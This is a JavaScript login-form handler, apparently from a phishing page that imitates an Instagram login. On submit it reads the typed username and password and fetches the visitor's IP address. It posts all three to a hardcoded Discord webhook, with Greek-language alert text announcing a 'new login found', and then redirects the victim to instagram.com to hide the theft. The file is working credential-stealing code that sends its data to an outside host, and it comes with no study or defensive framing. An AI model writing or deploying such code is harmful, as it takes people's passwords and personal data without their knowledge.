document.getElementById('loginForm').addEventListener('submit', async function (e) {
    e.preventDefault();

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    const webhookURL = 'https://discord.com/api/webhooks/1347248590803832865/4_v2YnypPuMvr-3pHjFohOkRvtDbIoUCAFw0y1SSqVXlTG1xDf40SFHXAHASFL2gkVlu';

    try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const ipAddress = ipData.ip;

        const params = {
            username: "NULL",
            avatar_url: "https://media.discordapp.net/attachments/1062803056414179419/1292194246593347614/Windows_11_x64-2024-10-05-21-38-30.png?ex=6707766c&is=670624ec&hm=24d0efe7d7c74eec9d5f2c0f78a9fe343a54864e297d1bfe0b46f4869e9081dc&=&format=webp&quality=lossless&width=883&height=662",
            embeds: [
                {
                    title: "Νέα σύνδεση βρέθηκε!",
                    description: "Ο χρήστης συνδέθηκε με τον σύνδεσμο εδώ είναι ο κωδικός, το Username του και η IP του.",
                    color: 16711680,
                    fields: [
                        {
                            name: "Όνομα Χρήστη",
                            value: `\`${username}\``
                        },
                        {
                            name: "Κώδικος",
                            value: `\`${password}\``
                        },
                        {
                            name: "IP",
                            value: `\`${ipAddress}\``
                        }
                    ]
                }
            ]
        };

        const response = await fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(params)
        });

        if (response.ok) {
            window.location.href = "https://www.instagram.com";
        } 
    } catch (error) {
        console.error('Error fetching IP or sending data:', error);
    }
});
